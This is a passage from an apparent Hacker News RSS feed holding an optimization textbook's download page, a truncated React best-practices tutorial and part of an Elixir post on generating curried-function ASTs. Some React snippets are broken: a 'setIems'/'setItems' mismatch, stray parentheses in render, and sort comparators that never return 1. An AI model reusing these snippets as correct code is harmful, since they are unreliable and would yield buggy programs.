<br/>
February 13, 2021 | https://algorithmsbook.com/optimization/ | <a href="https://web.archive.org/web/*/https://algorithmsbook.com/optimization/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="wrapper">



				<!-- Header -->

					



				<!-- Main -->

					<div id="main">



						<!-- Intro -->

							<article id="intro">

								<h2>Intro</h2>

								<p>This book provides a comprehensive introduction to optimization with a focus on practical algorithms. The book approaches optimization from an engineering perspective, where the objective is to design a system that optimizes a set of metrics subject to constraints. Readers will learn about computational approaches for a range of challenges, including searching high-dimensional spaces, handling problems where there are multiple competing objectives, and accommodating uncertainty in the metrics. Figures, examples, and exercises convey the intuition behind the mathematical approaches. The text provides concrete implementations in the Julia programming language. Topics covered include derivatives and their generalization to multiple dimensions; local descent and first- and second-order methods that inform local descent; stochastic methods, which introduce randomness into the optimization process; linear constrained optimization, when both the objective function and the constraints are linear; surrogate models, probabilistic surrogate models, and using probabilistic surrogate models to guide optimization; optimization under uncertainty; uncertainty propagation; expression optimization; and multidisciplinary design optimization. Appendixes offer an introduction to the Julia language, test functions for evaluating algorithm performance, and mathematical concepts used in the derivation and analysis of the optimization methods discussed in the text. The book can be used by advanced undergraduates and graduate students in mathematics, statistics, computer science, any engineering field, (including electrical engineering and aerospace engineering), and operations research, and as a reference for professionals.</p>

							</article>



						<!-- Download -->

							<article id="download">

								<h2>Download</h2>

								<p>The full book is available as a <a href="https://algorithmsbook.com/optimization/files/optimization.pdf" rel="nofollow">PDF</a>. You can also download <a href="#outline">individual chapters</a>. The PDF is shared under a under a Creative Commons CC-BY-NC-ND license.
								</p>
								<p>
									The copyright of this book has been licensed exclusively to <a href="http://mitpress.mit.edu/">The MIT Press</a>.  All inquiries regarding rights should be addressed to The MIT Press, Rights and Permissions Department.
									A <a href="https://mitpress.mit.edu/books/algorithms-optimization">print version</a> is available for purchase.
								</p>


							</article>



						<!-- Outline -->

							<article id="outline">

								<h2>Outline</h2>

								<ol>

								<li><a href="https://algorithmsbook.com/optimization/files/chapter-1.pdf" rel="nofollow">Introduction</a></li>

								<li><a href="https://algorithmsbook.com/optimization/files/chapter-2.pdf" rel="nofollow">Derivatives and Gradients</a></li>

								<li><a href="https://algorithmsbook.com/optimization/files/chapter-3.pdf" rel="nofollow">Bracketing</a></li>

								<li><a href="https://algorithmsbook.com/optimization/files/chapter-4.pdf" rel="nofollow">Local Descent</a></li>

								<li><a href="https://algorithmsbook.com/optimization/files/chapter-5.pdf" rel="nofollow">First-Order Methods</a></li>

								<li><a href="https://algorithmsbook.com/optimization/files/chapter-6.pdf" rel="nofollow">Second Order Methods</a></li>

								<li><a href="https://algorithmsbook.com/optimization/files/chapter-7.pdf" rel="nofollow">Direct Methods</a></li>

								<li><a href="https://algorithmsbook.com/optimization/files/chapter-8.pdf" rel="nofollow">Stochastic Methods</a></li>

								<li><a href="https://algorithmsbook.com/optimization/files/chapter-9.pdf" rel="nofollow">Population Methods</a></li>

								<li><a href="https://algorithmsbook.com/optimization/files/chapter-10.pdf" rel="nofollow">Constraints</a></li>

								<li><a href="https://algorithmsbook.com/optimization/files/chapter-11.pdf" rel="nofollow">Linear Constrained Optimization</a></li>

								<li><a href="https://algorithmsbook.com/optimization/files/chapter-12.pdf" rel="nofollow">Multiobjective Optimization</a></li>

								<li><a href="https://algorithmsbook.com/optimization/files/chapter-13.pdf" rel="nofollow">Sampling Plans</a></li>

								<li><a href="https://algorithmsbook.com/optimization/files/chapter-14.pdf" rel="nofollow">Surrogate Models</a></li>

								<li><a href="https://algorithmsbook.com/optimization/files/chapter-15.pdf" rel="nofollow">Probabilistic Surrogate Models</a></li>

								<li><a href="https://algorithmsbook.com/optimization/files/chapter-16.pdf" rel="nofollow">Surrogate Optimization</a></li>

								<li><a href="https://algorithmsbook.com/optimization/files/chapter-17.pdf" rel="nofollow">Optimization under Uncertainty</a></li>

								<li><a href="https://algorithmsbook.com/optimization/files/chapter-18.pdf" rel="nofollow">Uncertainty Propagation</a></li>

								<li><a href="https://algorithmsbook.com/optimization/files/chapter-19.pdf" rel="nofollow">Discrete Optimization</a></li>

								<li><a href="https://algorithmsbook.com/optimization/files/chapter-20.pdf" rel="nofollow">Expression Optimization</a></li>

								<li><a href="https://algorithmsbook.com/optimization/files/chapter-21.pdf" rel="nofollow">Multidisciplinary Optimization</a></li>

								</ol>

								<h3>Appendices</h3>

								<ol start="22">

								<li>A: <a href="https://algorithmsbook.com/optimization/files/appendix-a.pdf" rel="nofollow">Julia</a></li>

								<li>B: <a href="https://algorithmsbook.com/optimization/files/appendix-b.pdf" rel="nofollow">Test Functions</a></li>

								<li>C: <a href="https://algorithmsbook.com/optimization/files/appendix-c.pdf" rel="nofollow">Mathematical Concepts</a></li>

								<li>D: <a href="https://algorithmsbook.com/optimization/files/appendix-d.pdf" rel="nofollow">Solutions</a></li>

								</ol>

								

							</article>



						<!-- Bugs -->

							<article id="errata">

								<h2>Errata</h2>

								<p>Please file issues on <a href="https://github.com/algorithmsbooks/optimization/issues">GitHub</a> or email the address listed at the bottom of the pages of the PDF. The PDF is kept up to date with any corrections.

								</p>

							</article>



					</div>



				<!-- Footer -->

					



			</div></div>]]>
            </description>
            <link>https://algorithmsbook.com/optimization/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26124759</guid>
            <pubDate>Sat, 13 Feb 2021 17:02:37 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[React Best Practices for 2021]]>
            </title>
            <description>
<![CDATA[
Score 5 | Comments 5 (<a href="https://news.ycombinator.com/item?id=26124742">thread link</a>) | @thenoisywatcher
<br/>
February 13, 2021 | https://blog.asayer.io/6-react-best-practices-for-2021 | <a href="https://web.archive.org/web/*/https://blog.asayer.io/6-react-best-practices-for-2021">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article><div><p>Writing clean and readable code is essential to improve your code’s quality. On top of that, clean code is easier to test. There’s no reason not to spend five extra minutes refactoring your code to make it more readable.</p><p>This article looks at six React best practices for 2021 to improve your code. We’ll cover the following items:</p><ol><li>Make use of <code>event.target.name</code> for event handlers</li><li>How to avoid manually binding event handlers to <code>this</code>?</li><li>Make use of React hooks to update your state</li><li>Cache expensive operations with <code>useMemo</code></li><li>Decouple functions into functional functions to improve code quality</li><li>How do you create custom hooks in React?</li></ol><h2 id="1-use-event-handler-name">#1: Use event handler name</h2><p>When you have a form with a single input field, you’ll write one <code>onFirstInputChange</code> function to capture the contents of your input field.</p><p>However, do you write ten event handlers when you have a form with ten input fields? The answer is no.</p><p>We can set the name property on an input field and access it from the event handler. This value allows us to use a single input handler for <code>onChange</code> events. </p><p>Here’s your current situation when using a not-optimized form with two input fields. We have to define an <code>onChange</code> event handler for each individual form input element. This pattern creates a lot of duplicate code, which is hard to maintain.</p><div><pre><p><span>1</span><span>export</span><span> </span><span>default</span><span> </span><span>class</span><span> </span><span>App</span><span> </span><span>extends</span><span> </span><span>React</span><span>.</span><span>Component</span><span> </span><span>{</span><span></span></p><p><span>2</span><span>    </span><span>constructor</span><span>(</span><span>props</span><span>)</span><span> </span><span>{</span><span></span></p><p><span>3</span><span>        </span><span>super</span><span>(</span><span>props</span><span>)</span><span>;</span><span></span></p><p><span>4</span><span>        </span><span>this</span><span>.</span><span>state</span><span> </span><span>=</span><span> </span><span>{</span><span></span></p><p><span>5</span><span>            item1</span><span>:</span><span> </span><span>""</span><span>,</span><span></span></p><p><span>6</span><span>            item2</span><span>:</span><span> </span><span>""</span><span>,</span><span></span></p><p><span>7</span><span>            items</span><span>:</span><span> </span><span>""</span><span>,</span><span></span></p><p><span>8</span><span>            errorMsg</span><span>:</span><span> </span><span>""</span><span></span></p><p><span>9</span><span>        </span><span>}</span><span>;</span><span></span></p><p><span>10</span><span>        </span><span>this</span><span>.</span><span>onFirstInputChange</span><span> </span><span>=</span><span> </span><span>this</span><span>.</span><span>onFirstInputChange</span><span>.</span><span>bind</span><span>(</span><span>this</span><span>)</span><span>;</span><span></span></p><p><span>11</span><span>        </span><span>this</span><span>.</span><span>onSecondInputChange</span><span> </span><span>=</span><span> </span><span>this</span><span>.</span><span>onSecondInputChange</span><span>.</span><span>bind</span><span>(</span><span>this</span><span>)</span><span>;</span><span></span></p><p><span>12</span><span>    </span><span>}</span><span></span></p><p><span>13</span><span>    </span><span>onFirstInputChange</span><span>(</span><span>event</span><span>)</span><span> </span><span>{</span><span></span></p><p><span>14</span><span>        </span><span>const</span><span> value </span><span>=</span><span> event</span><span>.</span><span>target</span><span>.</span><span>value</span><span>;</span><span></span></p><p><span>15</span><span>        </span><span>this</span><span>.</span><span>setState</span><span>(</span><span>{</span><span></span></p><p><span>16</span><span>            item1</span><span>:</span><span> value</span></p><p><span>17</span><span>        </span><span>}</span><span>)</span><span>;</span><span></span></p><p><span>18</span><span>    </span><span>}</span><span></span></p><p><span>19</span><span>    </span><span>onSecondInputChange</span><span>(</span><span>event</span><span>)</span><span> </span><span>{</span><span></span></p><p><span>20</span><span>        </span><span>const</span><span> value </span><span>=</span><span> event</span><span>.</span><span>target</span><span>.</span><span>value</span><span>;</span><span></span></p><p><span>21</span><span>        </span><span>this</span><span>.</span><span>setState</span><span>(</span><span>{</span><span></span></p><p><span>22</span><span>            item2</span><span>:</span><span> value</span></p><p><span>23</span><span>        </span><span>}</span><span>)</span><span>;</span><span></span></p><p><span>24</span><span>    </span><span>}</span><span></span></p><p><span>25</span><span>    </span><span>render</span><span>(</span><span>)</span><span> </span><span>{</span><span></span></p><p><span>26</span><span>        </span><span>return</span><span> </span><span>(</span><span></span></p><p><span>27</span><span>            </span><span>&lt;</span><span>div</span><span>&gt;</span><span></span></p><p><span>28</span><span>                </span><span>&lt;</span><span>div className</span><span>=</span><span>"input-section"</span><span>&gt;</span><span></span></p><p><span>29</span><span>                    </span><span>{</span><span>this</span><span>.</span><span>state</span><span>.</span><span>errorMsg</span><span> </span><span>&amp;&amp;</span><span> </span><span>(</span><span></span></p><p><span>30</span><span>                        </span><span>&lt;</span><span>p className</span><span>=</span><span>"error-msg"</span><span>&gt;</span><span>{</span><span>this</span><span>.</span><span>state</span><span>.</span><span>errorMsg</span><span>}</span><span>&lt;</span><span>/</span><span>p</span><span>&gt;</span><span></span></p><p><span>31</span><span>                    </span><span>)</span><span>}</span><span></span></p><p><span>32</span><span>                    </span><span>&lt;</span><span>input</span></p><p><span>33</span><span>                        type</span><span>=</span><span>"text"</span><span></span></p><p><span>34</span><span>                        name</span><span>=</span><span>"item1"</span><span></span></p><p><span>35</span><span>                        placeholder</span><span>=</span><span>"Enter text"</span><span></span></p><p><span>36</span><span>                        value</span><span>=</span><span>{</span><span>this</span><span>.</span><span>state</span><span>.</span><span>item1</span><span>}</span><span></span></p><p><span>37</span><span>                        onChange</span><span>=</span><span>{</span><span>this</span><span>.</span><span>onFirstInputChange</span><span>}</span><span></span></p><p><span>38</span><span>                    </span><span>/</span><span>&gt;</span><span></span></p><p><span>39</span><span>                    </span><span>&lt;</span><span>input</span></p><p><span>40</span><span>                        type</span><span>=</span><span>"text"</span><span></span></p><p><span>41</span><span>                        name</span><span>=</span><span>"item2"</span><span></span></p><p><span>42</span><span>                        placeholder</span><span>=</span><span>"Enter more text"</span><span></span></p><p><span>43</span><span>                        value</span><span>=</span><span>{</span><span>this</span><span>.</span><span>state</span><span>.</span><span>item2</span><span>}</span><span></span></p><p><span>44</span><span>                        onChange</span><span>=</span><span>{</span><span>this</span><span>.</span><span>onSecondInputChange</span><span>}</span><span></span></p><p><span>45</span><span>                    </span><span>/</span><span>&gt;</span><span></span></p><p><span>46</span><span>                </span><span>&lt;</span><span>/</span><span>div</span><span>&gt;</span><span></span></p><p><span>47</span><span>            </span><span>&lt;</span><span>/</span><span>div</span><span>&gt;</span><span></span></p><p><span>48</span><span>      </span><span>)</span><span>;</span><span></span></p><p><span>49</span><span>    </span><span>}</span><span></span></p><p><span>50</span><span></span><span>}</span></p></pre></div><p>As you can see, each event handler function updates the state. When dealing with multiple form elements, your code becomes very messy as you have to write a new function for every event.</p><p>Let’s tackle this situation differently using the <code>name</code> field. We can access this value via the <code>event.target.name</code> property. Now, we can create a single function that can handle both events at once. Therefore, we can remove both functions <code>onFirstInputChange</code> and <code>onSecondInputChange</code>.</p><div><pre><p><span>1</span><span>onInputChange</span><span> </span><span>=</span><span> </span><span>(</span><span>event</span><span>)</span><span> </span><span>=&gt;</span><span> </span><span>{</span><span></span></p><p><span>2</span><span>  </span><span>const</span><span> name </span><span>=</span><span> event</span><span>.</span><span>target</span><span>.</span><span>name</span><span>;</span><span></span></p><p><span>3</span><span>  </span><span>const</span><span> value </span><span>=</span><span> event</span><span>.</span><span>target</span><span>.</span><span>value</span><span>;</span><span></span></p><p><span>4</span><span>  </span><span>this</span><span>.</span><span>setState</span><span>(</span><span>{</span><span></span></p><p><span>5</span><span>    </span><span>[</span><span>name</span><span>]</span><span>:</span><span> value</span></p><p><span>6</span><span>  </span><span>}</span><span>)</span><span>;</span><span></span></p><p><span>7</span><span></span><span>}</span><span>;</span></p></pre></div><p>Easy, right? Of course, you often need additional validation for the data you save to your state. You can make use of a <code>switch</code> statement to add custom validation rules for each submitted value.</p><h2 id="2-avoid-manually-binding-this">#2: Avoid manually binding <code>this</code></h2><p>You will most likely know that React doesn’t retain the <code>this</code> binding when attaching an event handler to an <code>onClick</code> or <code>onChange</code> event. Therefore, we need to bind <code>this</code> manually. <em>Why do we bind</em> <code>*this*</code><em>?</em> We want to bind the <code>this</code> of the event handler to the component’ instance, so we don’t lose its context when we pass it as a callback.</p><p>Here’s a classic “binding” example that happens in the constructor.</p><div><pre><p><span>1</span><span>class</span><span> </span><span>Button</span><span> </span><span>extends</span><span> </span><span>Component</span><span> </span><span>{</span><span></span></p><p><span>2</span><span>  </span><span>constructor</span><span>(</span><span>props</span><span>)</span><span> </span><span>{</span><span></span></p><p><span>3</span><span>    </span><span>super</span><span>(</span><span>props</span><span>)</span><span>;</span><span></span></p><p><span>4</span><span>    </span><span>this</span><span>.</span><span>state</span><span> </span><span>=</span><span> </span><span>{</span><span> clicked</span><span>:</span><span> </span><span>false</span><span> </span><span>}</span><span>;</span><span></span></p><p><span>5</span><span>    </span><span>this</span><span>.</span><span>handleClick</span><span> </span><span>=</span><span> </span><span>this</span><span>.</span><span>handleClick</span><span>.</span><span>bind</span><span>(</span><span>this</span><span>)</span><span>;</span><span></span></p><p><span>6</span><span>  </span><span>}</span><span></span></p><p><span>7</span><span>  </span></p><p><span>8</span><span>  </span><span>handleClick</span><span>(</span><span>)</span><span> </span><span>{</span><span></span></p><p><span>9</span><span>    </span><span>this</span><span>.</span><span>props</span><span>.</span><span>setState</span><span>(</span><span>{</span><span> clicked</span><span>:</span><span> </span><span>true</span><span> </span><span>}</span><span>)</span><span>;</span><span></span></p><p><span>10</span><span>  </span><span>}</span><span></span></p><p><span>11</span><span>  </span></p><p><span>12</span><span>  </span><span>render</span><span>(</span><span>)</span><span> </span><span>{</span><span></span></p><p><span>13</span><span>    </span><span>return</span><span> </span><span>&lt;</span><span>button onClick</span><span>=</span><span>{</span><span>this</span><span>.</span><span>handleClick</span><span>}</span><span>&gt;</span><span>Click</span><span> me</span><span>!</span><span>&lt;</span><span>/</span><span>button</span><span>&gt;</span><span>;</span><span></span></p><p><span>14</span><span>  </span><span>)</span><span>;</span><span></span></p><p><span>15</span><span></span><span>}</span></p></pre></div><p>Yet, binding is not necessary anymore since the <code>create-react-app</code> CLI command makes use of <code>@babel/babel-plugin-transform-class-properties</code> plugin version &gt;=7 and <code>babel/plugin-proposal-class-properties</code> plugin version &lt;7. </p><blockquote><p>Note: You have to change the event handler syntax to arrow function syntax.</p></blockquote><p>Below you find an example of the arrow function syntax. Here, we don’t need to write additional code in the constructor to bind <code>this</code>.</p><div><pre><p><span>1</span><span>class</span><span> </span><span>Button</span><span> </span><span>extends</span><span> </span><span>Component</span><span> </span><span>{</span><span></span></p><p><span>2</span><span>  </span><span>constructor</span><span>(</span><span>props</span><span>)</span><span> </span><span>{</span><span></span></p><p><span>3</span><span>    </span><span>super</span><span>(</span><span>props</span><span>)</span><span>;</span><span></span></p><p><span>4</span><span>    </span><span>this</span><span>.</span><span>state</span><span> </span><span>=</span><span> </span><span>{</span><span> clicked</span><span>:</span><span> </span><span>false</span><span> </span><span>}</span><span>;</span><span></span></p><p><span>5</span><span>  </span><span>}</span><span></span></p><p><span>6</span><span>  </span></p><p><span>7</span><span>  </span><span>handleClick</span><span> </span><span>=</span><span> </span><span>(</span><span>)</span><span> </span><span>=&gt;</span><span> </span><span>this</span><span>.</span><span>setState</span><span>(</span><span>{</span><span>clicked</span><span>:</span><span> </span><span>true</span><span> </span><span>}</span><span>)</span><span>;</span><span></span></p><p><span>8</span><span>  </span><span>render</span><span>(</span><span>)</span><span> </span><span>{</span><span></span></p><p><span>9</span><span>    </span><span>return</span><span> </span><span>&lt;</span><span>button onClick</span><span>=</span><span>{</span><span>this</span><span>.</span><span>handleClick</span><span>}</span><span>&gt;</span><span>Click</span><span> me</span><span>!</span><span>&lt;</span><span>/</span><span>button</span><span>&gt;</span><span>;</span><span></span></p><p><span>10</span><span>  </span><span>)</span><span>;</span><span></span></p><p><span>11</span><span></span><span>}</span></p></pre></div><p>That’s as simple it can get! You don’t need to worry about binding functions in your constructor.</p><h2 id="3-use-react-hooks-to-update-your-state">#3: Use React hooks to update your state</h2><p>Since React version 16.8.0, it’s now possible to use state and lifecycle methods inside functional components using React Hooks. In other words, we can write better readable code that’s also much easier to maintain.</p><p>For this, we’ll be using the <code>useState</code> hook. For those that are not aware of what a hook is and why you would use it. Here’s a short definition from the <a href="https://reactjs.org/docs/hooks-state.html#whats-a-hook" target="_blank" rel="noreferrer">React documentation</a>.</p><blockquote><p><strong>What is a Hook?</strong> A Hook is a special function that lets you “hook into” React features. For example, useState is a Hook that lets you add React state to function components.</p></blockquote><blockquote><p><strong>When would I use a Hook?</strong> If you write a function component and realize you need to add some state to it, previously you had to convert it to a class. Now you can use a Hook inside the existing function component.</p></blockquote><p>First, let’s take a look at how we update the state using the <code>setState</code> hook.</p><div><pre><p><span>1</span><span>this</span><span>.</span><span>setState</span><span>(</span><span>{</span><span></span></p><p><span>2</span><span>    errorMsg</span><span>:</span><span> </span><span>""</span><span>,</span><span></span></p><p><span>3</span><span>    items</span><span>:</span><span> </span><span>[</span><span>item1</span><span>,</span><span> item2</span><span>]</span><span></span></p><p><span>4</span><span></span><span>}</span><span>)</span><span>;</span></p></pre></div><p>Now, let’s make use of the <code>useState</code> hook. We need to import this hook from the <code>react</code> library. We can now declare new state variables and pass them an initial value. We’ll use destructuring to get a variable for retrieving the value and one for setting the value (this one is a function). Let’s take a look at how we can do this for the above example.</p><div><pre><p><span>1</span><span>import</span><span> </span><span>React</span><span>,</span><span> </span><span>{</span><span> useState </span><span>}</span><span> </span><span>from</span><span> </span><span>"react"</span><span>;</span><span></span></p><p><span>2</span><span></span></p><p><span>3</span><span></span><span>const</span><span> </span><span>App</span><span> </span><span>=</span><span> </span><span>(</span><span>)</span><span> </span><span>=&gt;</span><span> </span><span>{</span><span></span></p><p><span>4</span><span>  </span><span>const</span><span> </span><span>[</span><span>items</span><span>,</span><span> setIems</span><span>]</span><span> </span><span>=</span><span> </span><span>useState</span><span>(</span><span>[</span><span>]</span><span>)</span><span>;</span><span></span></p><p><span>5</span><span>  </span><span>const</span><span> </span><span>[</span><span>errorMsg</span><span>,</span><span> setErrorMsg</span><span>]</span><span> </span><span>=</span><span> </span><span>useState</span><span>(</span><span>""</span><span>)</span><span>;</span><span></span></p><p><span>6</span><span></span><span>}</span><span>;</span><span></span></p><p><span>7</span><span></span></p><p><span>8</span><span></span><span>export</span><span> </span><span>default</span><span> </span><span>App</span><span>;</span></p></pre></div><p>Now, you can directly access both constants <code>items</code> and <code>errorMsg</code> in your component.</p><p>Further, we can update the state inside a function like this:</p><div><pre><p><span>1</span><span>import</span><span> </span><span>React</span><span>,</span><span> </span><span>{</span><span> useState </span><span>}</span><span> </span><span>from</span><span> </span><span>"react"</span><span>;</span><span></span></p><p><span>2</span><span></span></p><p><span>3</span><span></span><span>const</span><span> </span><span>App</span><span> </span><span>=</span><span> </span><span>(</span><span>)</span><span> </span><span>=&gt;</span><span> </span><span>{</span><span></span></p><p><span>4</span><span>  </span><span>const</span><span> </span><span>[</span><span>items</span><span>,</span><span> setIems</span><span>]</span><span> </span><span>=</span><span> </span><span>useState</span><span>(</span><span>[</span><span>]</span><span>)</span><span>;</span><span></span></p><p><span>5</span><span>  </span><span>const</span><span> </span><span>[</span><span>errorMsg</span><span>,</span><span> setErrorMsg</span><span>]</span><span> </span><span>=</span><span> </span><span>useState</span><span>(</span><span>""</span><span>)</span><span>;</span><span></span></p><p><span>6</span><span></span></p><p><span>7</span><span>  </span><span>return</span><span> </span><span>(</span><span></span></p><p><span>8</span><span>    </span><span>&lt;</span><span>form</span><span>&gt;</span><span></span></p><p><span>9</span><span>        </span><span>&lt;</span><span>button onClick</span><span>=</span><span>{</span><span>(</span><span>)</span><span> </span><span>=&gt;</span><span> </span><span>setItems</span><span>(</span><span>[</span><span>"item A"</span><span>,</span><span> </span><span>"item B"</span><span>]</span><span>)</span><span>}</span><span>&gt;</span><span></span></p><p><span>10</span><span>          </span><span>Set</span><span> items</span></p><p><span>11</span><span>        </span><span>&lt;</span><span>/</span><span>button</span><span>&gt;</span><span></span></p><p><span>12</span><span>    </span><span>&lt;</span><span>/</span><span>form</span><span>&gt;</span><span></span></p><p><span>13</span><span>  </span><span>)</span><span>;</span><span></span></p><p><span>14</span><span></span><span>}</span><span>;</span><span></span></p><p><span>15</span><span></span></p><p><span>16</span><span></span><span>export</span><span> </span><span>default</span><span> </span><span>App</span><span>;</span></p></pre></div><p>That’s how you can use state hooks.</p><h2 id="4-cache-expensive-operations-with-usememo">#4: Cache expensive operations with useMemo</h2><p>Memoization is an optimization technique to store the result of expensive operations. In other words, a sorting operation is often an expensive operation that requires a lot of processing. We don’t want to execute this expensive function for every page render.</p><p>Therefore, we can use the <code>useMemo</code> hook to remember the output when you pass the same parameters to the <a href="https://rossbulat.medium.com/how-to-memoize-in-react-3d20cbcd2b6e" target="_blank" rel="noreferrer">memoized function</a>. The <code>useMemo</code> hook accepts a function and the input parameters to remember. React refers to this as a dependencies array. Every value referenced inside the function should also appear in your dependencies array.</p><p>Here’s a simple, abstract example. We pass two parameters <code>a</code> and <code>b</code> to an expensive function. As the function uses both parameters, we’ve to add them to the dependencies array for our <code>useMemo</code> hook.</p><div><pre><p><span>1</span><span>const</span><span> memoizedValue </span><span>=</span><span> </span><span>useMemo</span><span>(</span><span>(</span><span>)</span><span> </span><span>=&gt;</span><span> </span><span>computeExpensiveValue</span><span>(</span><span>a</span><span>,</span><span> b</span><span>)</span><span>,</span><span> </span><span>[</span><span>a</span><span>,</span><span> b</span><span>]</span><span>)</span><span>;</span></p></pre></div><h2 id="5-decouple-functions-into-pure-functions-to-improve-code-quality">#5: Decouple functions into pure functions to improve code quality</h2><p>As a general React best practice, you should decouple functions that don’t rely on your component. In other words, a function that doesn’t rely on any state or React hooks.</p><p>Therefore, a sorting function is an excellent example of a function that you can extract as a pure function. </p><p>You might wonder why you should embrace functional programming? </p><blockquote><p>Functional programming is the process of building software by composing pure functions, avoiding shared state, mutable data, and side-effects. Pure function are better readable and easier to test. Therefore, they improve code quality. - <a href="https://www.freecodecamp.org/news/intro-to-functional-programming-basics/" target="_blank" rel="noreferrer">freeCodeCamp</a></p></blockquote><p>Now, let’s apply this concept to React components. Here’s a function that can sit both inside a React component or outside. Both are comparison functions, which you can pass to an expensive sorting function, that accept two input parameters. As there’s no interaction with the state, we can extract both functions to pure functions. This allows us to place the pure functions in a separate file and import them in multiple locations if needed.</p><div><pre><p><span>1</span><span>function</span><span> </span><span>ascSort</span><span> </span><span>(</span><span>a</span><span>,</span><span> b</span><span>)</span><span> </span><span>{</span><span></span></p><p><span>2</span><span>  </span><span>return</span><span> a </span><span>&lt;</span><span> b </span><span>?</span><span> </span><span>-</span><span>1</span><span> </span><span>:</span><span> </span><span>(</span><span>b </span><span>&gt;</span><span> a </span><span>?</span><span> </span><span>1</span><span> </span><span>:</span><span> </span><span>0</span><span>)</span><span>;</span><span></span></p><p><span>3</span><span></span><span>}</span><span></span></p><p><span>4</span><span></span></p><p><span>5</span><span></span><span>function</span><span> </span><span>descSort</span><span> </span><span>(</span><span>a</span><span>,</span><span> b</span><span>)</span><span> </span><span>{</span><span></span></p><p><span>6</span><span>  </span><span>return</span><span> b </span><span>&lt;</span><span> a </span><span>?</span><span> </span><span>-</span><span>1</span><span> </span><span>:</span><span> </span><span>(</span><span>a </span><span>&gt;</span><span> b </span><span>?</span><span> </span><span>1</span><span> </span><span>:</span><span> </span><span>0</span><span>)</span><span>;</span><span></span></p><p><span>7</span><span></span><span>}</span></p></pre></div><h2 id="6-create-custom-react-hooks">#6: Create custom React hooks</h2><p>We’ve learned how to use the <code>useState</code> and <code>useMemo</code> React hooks. Yet, React allows you to define your own React hooks to extract logic and make components more readable. </p><p>We can specify custom React hooks starting with the <code>use</code> keyword, like all other React hooks. It’s beneficial when you want to share logic between different functions. Instead of copying the function, we can define the logic as a React hook and reuse it in other functions.</p><p>Here’s an example of a React component that updates the state when the screen size gets reduced to below 600 pixels. If this happens, the <code>isScreenSmall</code> variable is set to <code>true</code>. Otherwise, the variable is set to <code>fa…</code></p></div></article></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://blog.asayer.io/6-react-best-practices-for-2021">https://blog.asayer.io/6-react-best-practices-for-2021</a></em></p>]]>
            </description>
            <link>https://blog.asayer.io/6-react-best-practices-for-2021</link>
            <guid isPermaLink="false">hacker-news-small-sites-26124742</guid>
            <pubDate>Sat, 13 Feb 2021 17:00:50 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Cursed Curried Elixir]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26124431">thread link</a>) | @evuez
<br/>
February 13, 2021 | https://liftm.io/posts/cursed-curried-elixir.html | <a href="https://web.archive.org/web/*/https://liftm.io/posts/cursed-curried-elixir.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>
      
        <time datetime="2021-02-13">2021-02-13</time>
      <p>In <a href="https://liftm.io/posts/curried-elixir.html">Curried Elixir</a>, I said this:</p>
<blockquote>
<p>We're going to do this by wrapping <code>my_fun</code> in a chain of anonymous functions, each binding exactly one name:</p>
<pre><code>curried_fun =
  fn (a) -&gt;
    fn (b) -&gt;
      fn (c) -&gt;
        my_fun.(a, b, c)
      end
    end
  end
</code></pre>
</blockquote>
<p>And then went on implementing <code>curry</code> as a recursive function. But what if I actually want my curried function to be a chain of anonymous functions, and get rid of this recursive call?</p>
<p>The obvious thing to do would be to try to implement this as a macro instead. But I think we can do better than this.</p>
<p>First, let's look at the <a href="https://hexdocs.pm/elixir/syntax-reference.html#the-elixir-ast">AST</a> for the <code>curried_fun</code> above:</p>
<pre><code>iex&gt; quote do
...&gt;   fn (a) -&gt;
...&gt;     fn (b) -&gt;
...&gt;       fn (c) -&gt;
...&gt;         my_fun.(a, b, c)
...&gt;       end
...&gt;     end
...&gt;   end
...&gt; end
#                ▼ metadata                ▼ nested anonymous function
{:fn, [], [{:-&gt;, [], [[{:a, [], Elixir}], {:fn, [], [{:-&gt;, ...}]}]}]}
#                      ▲ list of parameters
</code></pre>
<p>This might look a bit messy, but there really isn't much going on:</p>
<pre><code>{:fn, [], # The definition with an empty list of metadata
 [
   {:-&gt;, [],
    [
      [{:a, [], Elixir}], # Left-hand side of `-&gt;`, the head of the anonymous function
      {:fn , [], # Right-hand side of `-&gt;`, the body of the anonymous function
       ...
</code></pre>
<h2>Building the AST</h2>
<p>Just to get started, let's see if we can write a function that generates this AST for us.
We want this function to take as arguments the length of the chain and the body of the innermost function in the chain:</p>
<pre><code>def make_chain(length_, body) do
  Enum.reduce(1..length_, body, fn x, acc -&gt;
    {:fn, [], [{:-&gt;, [], [[{:"arg#{x}", [], nil}], acc]}]}
  end)
end
</code></pre>
<p>Or better, use <a href="https://hexdocs.pm/elixir/Macro.html#generate_unique_arguments/2"><code>Macro.generate_unique_arguments/2</code></a> to generate the list of parameters for us:</p>
<pre><code>defmodule Func do
  def make_chain(length_, body) do
    length_
    |&gt; Macro.generate_unique_arguments(nil)
    |&gt; Enum.reverse() # Without this, the outermost function would get the last argument, which could make things confusing
    |&gt; Enum.reduce(body, fn arg, acc -&gt;
      {:fn, [], [{:-&gt;, [], [[arg], acc]}]}
    end)
  end
end
</code></pre>
<p>We can use <a href="https://hexdocs.pm/elixir/Macro.html#to_string/2"><code>Macro.to_string/1</code></a> to check if this works as expected:</p>
<pre><code>iex&gt; Macro.to_string(make_chain(2, "Foo"))
"fn arg1 -&gt; fn arg2 -&gt; \"Foo\" end end"
</code></pre>
<p>Perfect! 🎉</p>
<p>We have one thing left to do before we can start rewriting <code>curry</code>: we need to generate the AST to call <code>fun</code>. This is actually pretty easy:</p>
<pre><code>iex&gt; quote do: fun.(a, b)
{{:., [], [{:fun, [], Elixir}]}, [], [{:a, [], Elixir}, {:b, [], Elixir}]}
</code></pre>
<p>All we need is <a href="https://hexdocs.pm/elixir/Macro.html#generate_unique_arguments/2"><code>Macro.generate_unique_arguments/2</code></a> and <a href="https://hexdocs.pm/elixir/master/Function.html#info/2"><code>Function.info/2</code></a> to get the arity of <code>fun</code>:</p>
<pre><code>iex&gt; fun = &amp;Map.get/2
iex&gt; {:arity, arity} = Function.info(fun, :arity)
iex&gt; params = Macro.generate_unique_arguments(arity, nil)
